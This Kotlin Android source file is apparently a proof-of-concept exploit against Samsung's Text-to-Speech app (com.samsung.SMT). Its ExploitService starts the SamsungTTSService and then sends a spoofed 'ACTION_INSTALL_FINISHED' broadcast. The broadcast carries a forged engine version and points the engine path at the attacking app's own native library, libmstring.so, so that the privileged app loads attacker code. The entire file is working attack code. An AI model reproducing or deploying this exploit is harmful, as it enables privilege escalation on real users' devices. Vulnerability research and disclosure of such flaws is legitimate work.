package com.samsung.SMT.lang.poc

import android.app.Service
import android.content.ComponentName
import android.content.Intent
import android.os.IBinder

class ExploitService : Service() {
    override fun onCreate() {
        val serviceIntent = Intent().apply {
            component = ComponentName("com.samsung.SMT", "com.samsung.SMT.SamsungTTSService")
        }

        application.startService(serviceIntent)

        val intent = Intent("com.samsung.SMT.ACTION_INSTALL_FINISHED").apply {
            setPackage("com.samsung.SMT")
            putExtra("SMT_ENGINE_VERSION", 361904052)
            putExtra("SMT_ENGINE_PATH", "${application.applicationInfo.nativeLibraryDir}/libmstring.so")
        }

        application.sendBroadcast(intent)

        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
